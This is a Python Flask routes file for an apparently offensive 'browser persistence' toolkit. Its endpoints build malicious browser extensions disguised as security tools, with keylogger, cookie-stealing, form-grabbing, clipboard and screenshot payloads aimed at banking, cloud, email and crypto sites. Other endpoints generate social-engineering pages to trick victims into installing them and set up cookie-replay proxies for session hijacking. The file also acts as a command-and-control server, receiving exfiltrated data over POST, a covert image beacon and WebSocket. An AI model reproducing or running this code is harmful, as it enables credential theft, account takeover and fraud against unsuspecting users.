"""
Browser Persistence & Extension Ops - Flask API Routes
=======================================================

Endpoints:
- Extension Factory: Generate malicious browser extensions
- Cookie Replay Proxy: Session riding via reverse proxy

Author: ITherso
"""

import os
import io
import json
import base64
from datetime import datetime
from flask import Blueprint, render_template, request, jsonify, send_file, Response
from typing import Dict, Any, List, Optional

# Import core module
import sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))

try:
    from browser_persistence import (
        MaliciousExtensionFactory,
        CookieReplayProxy,
        ExtensionConfig,
        ExtensionType,
        PayloadType,
        BrowserType,
        generate_social_engineering_page
    )
except ImportError:
    MaliciousExtensionFactory = None
    CookieReplayProxy = None


# Create Blueprint
browser_persistence_bp = Blueprint(
    'browser_persistence',
    __name__,
    url_prefix='/browser-persistence'
)

# Initialize factories
extension_factory = MaliciousExtensionFactory() if MaliciousExtensionFactory else None
cookie_proxy = CookieReplayProxy() if CookieReplayProxy else None


# ============ PAGE ROUTES ============

@browser_persistence_bp.route('/')
def browser_persistence_index():
    """Main dashboard page"""
    return render_template('browser_persistence.html')


# ============ EXTENSION FACTORY API ============

@browser_persistence_bp.route('/api/extension/types', methods=['GET'])
def get_extension_types():
    """Get available extension disguise types"""
    
    if not extension_factory:
        return jsonify({"error": "Extension factory not available"}), 500
    
    types = []
    for ext_type in ExtensionType:
        template = extension_factory.EXTENSION_TEMPLATES.get(ext_type, {})
        types.append({
            "id": ext_type.value,
            "name": template.get("name", ext_type.value),
            "description": template.get("description", ""),
            "icon_color": template.get("icon_color", "#4CAF50")
        })
    
    return jsonify({
        "success": True,
        "types": types
    })


@browser_persistence_bp.route('/api/extension/payloads', methods=['GET'])
def get_payload_types():
    """Get available payload types"""
    
    payloads = [
        {
            "id": "keylogger",
            "name": "Keylogger",
            "description": "Capture all keystrokes in input fields",
            "icon": "⌨️"
        },
        {
            "id": "cookie_stealer",
            "name": "Cookie Stealer",
            "description": "Steal all cookies and session tokens",
            "icon": "🍪"
        },
        {
            "id": "form_grabber",
            "name": "Form Grabber",
            "description": "Capture form submissions including passwords",
            "icon": "📝"
        },
        {
            "id": "clipboard_monitor",
            "name": "Clipboard Monitor",
            "description": "Monitor copy/paste operations",
            "icon": "📋"
        },
        {
            "id": "screenshot",
            "name": "Screenshot",
            "description": "Capture periodic screenshots",
            "icon": "📸"
        },
        {
            "id": "full_suite",
            "name": "Full Suite",
            "description": "All payloads combined",
            "icon": "💀"
        }
    ]
    
    return jsonify({
        "success": True,
        "payloads": payloads
    })


@browser_persistence_bp.route('/api/extension/targets', methods=['GET'])
def get_default_targets():
    """Get default high-value target domains"""
    
    if not extension_factory:
        return jsonify({"error": "Extension factory not available"}), 500
    
    # Categorize targets
    categories = {
        "banking": [t for t in extension_factory.HIGH_VALUE_TARGETS 
                    if any(b in t for b in ['bank', 'chase', 'wells', 'citi', 'capital'])],
        "cloud": [t for t in extension_factory.HIGH_VALUE_TARGETS
                  if any(c in t for c in ['aws', 'azure', 'google', 'digitalocean'])],
        "email": [t for t in extension_factory.HIGH_VALUE_TARGETS
                  if any(e in t for e in ['mail', 'gmail', 'outlook', 'proton'])],
        "crypto": [t for t in extension_factory.HIGH_VALUE_TARGETS
                   if any(c in t for c in ['coinbase', 'binance', 'kraken', 'crypto'])],
        "social": [t for t in extension_factory.HIGH_VALUE_TARGETS
                   if any(s in t for s in ['facebook', 'twitter', 'linkedin', 'slack', 'discord'])],
        "dev": [t for t in extension_factory.HIGH_VALUE_TARGETS
                if any(d in t for d in ['github', 'gitlab', 'bitbucket'])]
    }
    
    return jsonify({
        "success": True,
        "targets": extension_factory.HIGH_VALUE_TARGETS,
        "categories": categories
    })


@browser_persistence_bp.route('/api/extension/generate', methods=['POST'])
def generate_extension():
    """Generate a malicious browser extension"""
    
    if not extension_factory:
        return jsonify({"error": "Extension factory not available"}), 500
    
    try:
        data = request.get_json()
        
        # Parse extension type
        ext_type_str = data.get('extension_type', 'security_scanner')
        try:
            ext_type = ExtensionType(ext_type_str)
        except ValueError:
            ext_type = ExtensionType.SECURITY_SCANNER
        
        # Parse payload type
        payload_str = data.get('payload_type', 'full_suite')
        try:
            payload_type = PayloadType(payload_str)
        except ValueError:
            payload_type = PayloadType.FULL_SUITE
        
        # Parse browser type
        browser_str = data.get('browser', 'chrome')
        try:
            browser = BrowserType(browser_str)
        except ValueError:
            browser = BrowserType.CHROME
        
        # Get target domains
        targets = data.get('target_domains', [])
        if not targets:
            targets = extension_factory.HIGH_VALUE_TARGETS[:20]
        
        # Create config
        config = ExtensionConfig(
            name=data.get('name', ''),
            version=data.get('version', '1.0.0'),
            description=data.get('description', ''),
            extension_type=ext_type,
            payload_type=payload_type,
            c2_url=data.get('c2_url', 'http://localhost:8080'),
            exfil_interval=int(data.get('exfil_interval', 30)),
            target_domains=targets,
            stealth_level=data.get('stealth_level', 'high'),
            browser=browser
        )
        
        # Generate extension
        extension = extension_factory.generate_extension(config)
        
        return jsonify({
            "success": True,
            "extension": {
                "name": extension.name,
                "version": extension.version,
                "extension_id": extension.extension_id,
                "files": list(extension.files.keys()),
                "manifest": extension.manifest,
                "install_instructions": extension.install_instructions
            }
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 400


@browser_persistence_bp.route('/api/extension/download/<extension_id>', methods=['GET'])
def download_extension(extension_id: str):
    """Download generated extension as ZIP"""
    
    if not extension_factory:
        return jsonify({"error": "Extension factory not available"}), 500
    
    extension = extension_factory.generated_extensions.get(extension_id)
    if not extension:
        return jsonify({"error": "Extension not found"}), 404
    
    # Package as ZIP
    zip_data = extension_factory.package_as_zip(extension)
    
    # Create filename
    safe_name = extension.name.replace(' ', '_').lower()
    filename = f"{safe_name}_v{extension.version}.zip"
    
    return send_file(
        io.BytesIO(zip_data),
        mimetype='application/zip',
        as_attachment=True,
        download_name=filename
    )


@browser_persistence_bp.route('/api/extension/preview/<extension_id>/<path:filename>', methods=['GET'])
def preview_extension_file(extension_id: str, filename: str):
    """Preview a file from generated extension"""
    
    if not extension_factory:
        return jsonify({"error": "Extension factory not available"}), 500
    
    extension = extension_factory.generated_extensions.get(extension_id)
    if not extension:
        return jsonify({"error": "Extension not found"}), 404
    
    content = extension.files.get(filename)
    if content is None:
        return jsonify({"error": "File not found"}), 404
    
    # Determine content type
    if filename.endswith('.js'):
        content_type = 'application/javascript'
    elif filename.endswith('.json'):
        content_type = 'application/json'
    elif filename.endswith('.html'):
        content_type = 'text/html'
    elif filename.endswith('.css'):
        content_type = 'text/css'
    else:
        content_type = 'text/plain'
    
    return Response(content, content_type=content_type)


@browser_persistence_bp.route('/api/extension/social-engineering', methods=['POST'])
def generate_social_engineering():
    """Generate social engineering landing page"""
    
    try:
        data = request.get_json()
        
        extension_id = data.get('extension_id')
        company_name = data.get('company_name', 'IT Security')
        
        # Get extension info
        extension = None
        extension_name = "Security Extension"
        
        if extension_factory and extension_id:
            extension = extension_factory.generated_extensions.get(extension_id)
            if extension:
                extension_name = extension.name
        
        # Generate page
        html = generate_social_engineering_page(
            extension_name=data.get('extension_name', extension_name),
            extension_file=data.get('download_url', f'/browser-persistence/api/extension/download/{extension_id}'),
            company_name=company_name
        )
        
        return jsonify({
            "success": True,
            "html": html
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 400


# ============ COOKIE REPLAY PROXY API ============

@browser_persistence_bp.route('/api/proxy/sessions', methods=['GET'])
def list_proxy_sessions():
    """List all cookie replay sessions"""
    
    if not cookie_proxy:
        return jsonify({"error": "Cookie proxy not available"}), 500
    
    sessions = cookie_proxy.list_sessions()
    return jsonify({
        "success": True,
        "sessions": sessions
    })


@browser_persistence_bp.route('/api/proxy/sessions', methods=['POST'])
def create_proxy_session():
    """Create a new cookie replay session"""
    
    if not cookie_proxy:
        return jsonify({"error": "Cookie proxy not available"}), 500
    
    try:
        data = request.get_json()
        
        domain = data.get('domain')
        cookies = data.get('cookies', {})
        user_agent = data.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        victim_ip = data.get('victim_ip', '192.168.1.100')
        
        if not domain:
            return jsonify({"error": "Domain is required"}), 400
        
        # Parse cookies if string
        if isinstance(cookies, str):
            parsed = {}
            for cookie in cookies.split(';'):
                cookie = cookie.strip()
                if '=' in cookie:
                    name, value = cookie.split('=', 1)
                    parsed[name.strip()] = value.strip()
            cookies = parsed
        
        # Create session
        session = cookie_proxy.add_session(
            domain=domain,
            cookies=cookies,
            user_agent=user_agent,
            victim_ip=victim_ip
        )
        
        return jsonify({
            "success": True,
            "session": {
                "session_id": session.session_id,
                "domain": session.domain,
                "cookie_count": len(session.cookies),
                "captured_at": session.captured_at.isoformat()
            }
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 400


@browser_persistence_bp.route('/api/proxy/tunnel', methods=['POST'])
def create_proxy_tunnel():
    """Create a reverse proxy tunnel for a session"""
    
    if not cookie_proxy:
        return jsonify({"error": "Cookie proxy not available"}), 500
    
    try:
        data = request.get_json()
        session_id = data.get('session_id')
        
        if not session_id:
            return jsonify({"error": "Session ID is required"}), 400
        
        # Create tunnel
        tunnel = cookie_proxy.create_tunnel(session_id)
        
        if not tunnel:
            return jsonify({"error": "Session not found"}), 404
        
        # Generate proxy configs
        config = cookie_proxy.generate_proxy_config(tunnel)
        
        return jsonify({
            "success": True,
            "tunnel": {
                "tunnel_id": tunnel.tunnel_id,
                "local_port": tunnel.local_port,
                "status": tunnel.status,
                "created_at": tunnel.created_at.isoformat()
            },
            "config": config
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 400


@browser_persistence_bp.route('/api/proxy/config/<tunnel_id>', methods=['GET'])
def get_proxy_config(tunnel_id: str):
    """Get proxy configuration for a tunnel"""
    
    if not cookie_proxy:
        return jsonify({"error": "Cookie proxy not available"}), 500
    
    tunnel = cookie_proxy.tunnels.get(tunnel_id)
    if not tunnel:
        return jsonify({"error": "Tunnel not found"}), 404
    
    config = cookie_proxy.generate_proxy_config(tunnel)
    
    return jsonify({
        "success": True,
        "config": config
    })


@browser_persistence_bp.route('/api/proxy/nginx/<tunnel_id>', methods=['GET'])
def get_nginx_config(tunnel_id: str):
    """Get nginx configuration for a tunnel"""
    
    if not cookie_proxy:
        return jsonify({"error": "Cookie proxy not available"}), 500
    
    tunnel = cookie_proxy.tunnels.get(tunnel_id)
    if not tunnel:
        return jsonify({"error": "Tunnel not found"}), 404
    
    nginx_config = cookie_proxy.generate_nginx_config(tunnel)
    
    return Response(nginx_config, content_type='text/plain')


@browser_persistence_bp.route('/api/proxy/nodejs/<tunnel_id>', methods=['GET'])
def get_nodejs_proxy(tunnel_id: str):
    """Get Node.js proxy server code for a tunnel"""
    
    if not cookie_proxy:
        return jsonify({"error": "Cookie proxy not available"}), 500
    
    tunnel = cookie_proxy.tunnels.get(tunnel_id)
    if not tunnel:
        return jsonify({"error": "Tunnel not found"}), 404
    
    nodejs_code = cookie_proxy.generate_nodejs_proxy(tunnel)
    
    return Response(nodejs_code, content_type='application/javascript')


@browser_persistence_bp.route('/api/proxy/mitmproxy/<tunnel_id>', methods=['GET'])
def get_mitmproxy_script(tunnel_id: str):
    """Get mitmproxy addon script for a tunnel"""
    
    if not cookie_proxy:
        return jsonify({"error": "Cookie proxy not available"}), 500
    
    tunnel = cookie_proxy.tunnels.get(tunnel_id)
    if not tunnel:
        return jsonify({"error": "Tunnel not found"}), 404
    
    mitmproxy_script = cookie_proxy._generate_mitmproxy_script(tunnel.session)
    
    return Response(mitmproxy_script, content_type='text/x-python')


# ============ DATA COLLECTION ENDPOINTS (for C2) ============

@browser_persistence_bp.route('/api/collect', methods=['POST'])
def collect_exfiltrated_data():
    """
    C2 endpoint to receive exfiltrated data from extensions
    This would normally store data in a database
    """
    
    try:
        data = request.get_json()
        
        # Decode base64 payload
        if 'd' in data:
            try:
                decoded = base64.b64decode(data['d']).decode('utf-8')
                payload = json.loads(decoded)
            except:
                payload = data
        else:
            payload = data
        
        # Log (in production, store in database)
        session_id = payload.get('sessionId', 'unknown')
        timestamp = datetime.utcnow().isoformat()
        
        print(f"[{timestamp}] Data received from session: {session_id}")
        
        # Store in memory for demo (use database in production)
        if not hasattr(collect_exfiltrated_data, 'collected_data'):
            collect_exfiltrated_data.collected_data = []
        
        collect_exfiltrated_data.collected_data.append({
            "session_id": session_id,
            "timestamp": timestamp,
            "data": payload.get('data', {}),
            "meta": payload.get('meta', {})
        })
        
        # Keep last 100 entries
        if len(collect_exfiltrated_data.collected_data) > 100:
            collect_exfiltrated_data.collected_data = collect_exfiltrated_data.collected_data[-100:]
        
        return jsonify({"status": "ok"})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400


@browser_persistence_bp.route('/api/collected', methods=['GET'])
def get_collected_data():
    """Get all collected data (for operator review)"""
    
    if not hasattr(collect_exfiltrated_data, 'collected_data'):
        collect_exfiltrated_data.collected_data = []
    
    return jsonify({
        "success": True,
        "count": len(collect_exfiltrated_data.collected_data),
        "data": collect_exfiltrated_data.collected_data
    })


@browser_persistence_bp.route('/beacon.gif', methods=['GET'])
def beacon_endpoint():
    """Image beacon endpoint for covert data exfiltration"""
    
    session_id = request.args.get('s', 'unknown')
    chunk_index = request.args.get('c', '0')
    total_chunks = request.args.get('t', '1')
    data = request.args.get('d', '')
    
    if data:
        # Process chunked data
        print(f"[BEACON] Session: {session_id}, Chunk: {chunk_index}/{total_chunks}")
        
        # Store chunk
        if not hasattr(beacon_endpoint, 'chunks'):
            beacon_endpoint.chunks = {}
        
        chunk_key = f"{session_id}_{total_chunks}"
        if chunk_key not in beacon_endpoint.chunks:
            beacon_endpoint.chunks[chunk_key] = {}
        
        beacon_endpoint.chunks[chunk_key][int(chunk_index)] = data
        
        # Check if all chunks received
        if len(beacon_endpoint.chunks[chunk_key]) == int(total_chunks):
            # Reassemble
            full_data = ''.join([
                beacon_endpoint.chunks[chunk_key][i] 
                for i in range(int(total_chunks))
            ])
            print(f"[BEACON] Complete data received for session: {session_id}")
            del beacon_endpoint.chunks[chunk_key]
    
    # Return 1x1 transparent GIF
    gif_bytes = base64.b64decode(
        'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'
    )
    
    return Response(gif_bytes, content_type='image/gif')


# ============ WEBSOCKET SUPPORT (if available) ============

try:
    from flask_socketio import SocketIO, emit
    
    def init_websocket(socketio):
        """Initialize WebSocket handlers for real-time data collection"""
        
        @socketio.on('connect', namespace='/ws/collect')
        def ws_connect():
            print('[WS] Client connected')
        
        @socketio.on('data', namespace='/ws/collect')
        def ws_data(message):
            session_id = message.get('session', 'unknown')
            data = message.get('data', '')
            
            print(f'[WS] Data received from session: {session_id}')
            
            # Process data
            try:
                decoded = base64.b64decode(data).decode('utf-8')
                payload = json.loads(decoded)
                
                # Store
                if not hasattr(collect_exfiltrated_data, 'collected_data'):
                    collect_exfiltrated_data.collected_data = []
                
                collect_exfiltrated_data.collected_data.append({
                    "session_id": session_id,
                    "timestamp": datetime.utcnow().isoformat(),
                    "data": payload,
                    "source": "websocket"
                })
                
            except Exception as e:
                print(f'[WS] Error processing data: {e}')
            
            emit('ack', {'status': 'received'})
        
        @socketio.on('disconnect', namespace='/ws/collect')
        def ws_disconnect():
            print('[WS] Client disconnected')
    
except ImportError:
    def init_websocket(socketio):
        pass


# ============ HELPER FUNCTIONS ============

def get_extension_stats():
    """Get statistics about generated extensions"""
    
    if not extension_factory:
        return {}
    
    return {
        "total_generated": len(extension_factory.generated_extensions),
        "extensions": [
            {
                "id": ext_id,
                "name": ext.name,
                "version": ext.version
            }
            for ext_id, ext in extension_factory.generated_extensions.items()
        ]
    }


def get_proxy_stats():
    """Get statistics about cookie replay sessions"""
    
    if not cookie_proxy:
        return {}
    
    return {
        "active_sessions": len(cookie_proxy.sessions),
        "active_tunnels": len(cookie_proxy.tunnels),
        "sessions": [
            cookie_proxy.get_session_status(sid)
            for sid in cookie_proxy.sessions.keys()
        ]
    }
